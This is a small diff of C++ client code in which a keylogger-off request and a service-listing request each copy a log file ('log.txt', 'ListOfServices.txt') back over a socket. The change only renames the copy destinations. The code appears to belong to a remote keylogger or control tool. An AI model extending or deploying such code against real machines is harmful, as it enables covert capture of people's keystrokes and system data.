@@ -88,7 +88,7 @@ bool Client::sendKeyloggerOffRequest(){
         std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
         return false;
     }
-    sendFileCopyRequest("log.txt", "log.txt");
+    sendFileCopyRequest("log.txt", "copy_log.txt");
     return true;
 }
    
@@ -227,7 +227,7 @@ bool Client::sendListOfServiceRequest(){
         std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
         return false;
     }
-    sendFileCopyRequest("ListOfServices.txt", "copyListOfServices.txt");
+    sendFileCopyRequest("ListOfServices.txt", "copy_ListOfServices.txt");
     return true;
 }
 
